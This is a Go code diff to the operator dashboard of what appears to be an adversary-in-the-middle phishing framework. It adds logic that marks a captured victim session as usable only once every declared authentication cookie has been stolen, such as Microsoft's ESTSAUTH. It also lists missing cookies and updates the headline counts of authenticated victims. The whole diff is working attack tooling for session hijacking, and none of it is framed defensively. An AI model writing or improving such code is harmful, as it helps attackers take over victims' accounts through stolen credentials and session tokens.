@@ -52,18 +52,82 @@ type panelSession struct {
 	TokenCount int    `json:"token_count"`
 	// Stage/Usable are the truthful view: Usable is only true once the provider
 	// confirmed the login, so an abandoned email entry never looks captured.
-	Stage        int                                         `json:"stage"`
-	StageName    string                                      `json:"stage_name"`
-	Usable       bool                                        `json:"usable"`
-	Custom       map[string]string                           `json:"custom,omitempty"`
-	BodyTokens   map[string]string                           `json:"body_tokens,omitempty"`
-	HttpTokens   map[string]string                           `json:"http_tokens,omitempty"`
-	CookieTokens map[string]map[string]*database.CookieToken `json:"tokens,omitempty"`
-	Geo          *panelGeo                                   `json:"geo,omitempty"`
-	Reviewed     bool                                        `json:"reviewed"`
+	Stage     int    `json:"stage"`
+	StageName string `json:"stage_name"`
+	// Usable requires cookie evidence, not just a submitted password. UsableReason
+	// always says why, and MissingCookies lists what a partial capture lacks.
+	Usable         bool                                        `json:"usable"`
+	UsableReason   string                                      `json:"usable_reason"`
+	MissingCookies []string                                    `json:"missing_cookies,omitempty"`
+	Custom         map[string]string                           `json:"custom,omitempty"`
+	BodyTokens     map[string]string                           `json:"body_tokens,omitempty"`
+	HttpTokens     map[string]string                           `json:"http_tokens,omitempty"`
+	CookieTokens   map[string]map[string]*database.CookieToken `json:"tokens,omitempty"`
+	Geo            *panelGeo                                   `json:"geo,omitempty"`
+	Reviewed       bool                                        `json:"reviewed"`
 }
 
-func toPanelSession(s *database.Session) *panelSession {
+// usableState applies the cookie-evidence rule at read time, so rows written
+// before the rule existed (or promoted on weaker evidence) are corrected here too.
+//
+// Usable is decided by evidence, not by the stage machine: a complete set of the
+// phishlet's declared auth cookies is the thing that actually signs a victim in.
+// The stage is only a fallback for phishlets that declare no tokens, and it keeps
+// a session that has captured nothing at all from reading as usable.
+func (ds *DashboardServer) usableState(s *database.Session) (bool, string, []string) {
+	st := effectiveStage(s)
+	pl, err := ds.cfg.GetPhishlet(s.Phishlet)
+	if err != nil || pl == nil {
+		if st >= database.StageAuthenticated {
+			return true, "authenticated (phishlet not loaded, cookie evidence unchecked)", nil
+		}
+		return false, "stage: " + stageName(st), nil
+	}
+	declared := 0
+	for _, v := range pl.cookieAuthTokens {
+		for _, at := range v {
+			if !at.optional {
+				declared++
+			}
+		}
+	}
+	if declared == 0 {
+		// Nothing to check against: fall back to password + provider confirmation.
+		if st >= database.StageAuthenticated {
+			return true, "phishlet declares no auth cookies; password + provider confirmation", nil
+		}
+		return false, "stage: " + stageName(st), nil
+	}
+	rs := &Session{CookieTokens: s.CookieTokens}
+	missing := rs.MissingCookieAuthTokens(pl.cookieAuthTokens)
+	if len(missing) == 0 {
+		if rs.HasAnyCookieAuthToken(pl.cookieAuthTokens) {
+			return true, "all declared auth cookies captured", nil
+		}
+		return false, "no declared auth cookies captured yet", nil
+	}
+	flat := []string{}
+	for d, names := range missing {
+		for _, n := range names {
+			flat = append(flat, d+":"+n)
+		}
+	}
+	sort.Strings(flat)
+	var req []string
+	for d, set := range pl.cookieAuthTokens {
+		for _, at := range set {
+			if !at.optional {
+				req = append(req, d+"/"+at.label())
+			}
+		}
+	}
+	sort.Strings(req)
+	log.Debug("usable check: session=%d phishlet=%s missing=[%s] buckets=%d required=[%s]",
+		s.Id, s.Phishlet, strings.Join(flat, ","), len(pl.cookieAuthTokens), strings.Join(req, ","))
+	return false, "missing auth cookies: " + missingSummary(missing), flat
+}
+
+func (ds *DashboardServer) toPanelSession(s *database.Session) *panelSession {
 	count := 0
 	for _, g := range s.CookieTokens {
 		count += len(g)
@@ -89,7 +153,7 @@ func toPanelSession(s *database.Session) *panelSession {
 		Reviewed:     s.Reviewed,
 	}
 	ps.StageName = stageName(ps.Stage)
-	ps.Usable = ps.Stage >= database.StageAuthenticated
+	ps.Usable, ps.UsableReason, ps.MissingCookies = ds.usableState(s)
 	if g := geoFromCustom(s.Custom); g != nil {
 		ps.Geo = g
 	}
@@ -177,13 +241,19 @@ func (ds *DashboardServer) handleOverview(w http.ResponseWriter, r *http.Request
 		if cn := s.Custom["geo_country_name"]; cn != "" {
 			byCountry[cn]++
 		}
-		switch effectiveStage(s) {
-		case database.StageAuthenticated:
+		// Count by evidence, not by the stage machine, so the headline agrees with
+		// the per-row badges: a promoted row with incomplete cookies (e.g. no
+		// ESTSAUTH) is partial, and a row with complete cookies is authenticated
+		// even if it never passed through an auth_url hop.
+		if usable, _, _ := ds.usableState(s); usable {
 			authenticated++
-		case database.StageCredentials:
-			credentialsOnly++
-		case database.StageEmail:
-			emailOnly++
+		} else {
+			switch effectiveStage(s) {
+			case database.StageAuthenticated, database.StageCredentials:
+				credentialsOnly++
+			case database.StageEmail:
+				emailOnly++
+			}
 		}
 	}
 
@@ -434,7 +504,7 @@ func (ds *DashboardServer) handleSessions(w http.ResponseWriter, r *http.Request
 
 	out := make([]*panelSession, 0, len(page))
 	for _, s := range page {
-		out = append(out, toPanelSession(s))
+		out = append(out, ds.toPanelSession(s))
 	}
 
 	plNames := make([]string, 0, len(plSet))
@@ -463,7 +533,7 @@ func (ds *DashboardServer) handleSessionDetail(w http.ResponseWriter, r *http.Re
 		jsonErr(w, 404, "session not found")
 		return
 	}
-	writeJSON(w, 200, toPanelSession(s))
+	writeJSON(w, 200, ds.toPanelSession(s))
 }
 
 func (ds *DashboardServer) handleSessionDelete(w http.ResponseWriter, r *http.Request) {
@@ -807,18 +877,16 @@ func (ds *DashboardServer) handlePhishletsRefresh(w http.ResponseWriter, r *http
 		jsonErr(w, 500, "cannot read phishlets directory: "+err.Error())
 		return
 	}
-	pr := regexp.MustCompile(`([a-zA-Z0-9\-\.]*)\.yaml`)
 	added, refreshed := []string{}, []string{}
 	reloadedEnabled := false
 	for _, f := range files {
 		if f.IsDir() {
 			continue
 		}
-		m := pr.FindStringSubmatch(f.Name())
-		if m == nil || m[1] == "" {
+		name, ok := PhishletSiteFromFile(f.Name())
+		if !ok {
 			continue
 		}
-		name := m[1]
 		existing, lookupErr := ds.cfg.GetPhishlet(name)
 		if lookupErr == nil && existing.ParentName != "" {
 			continue
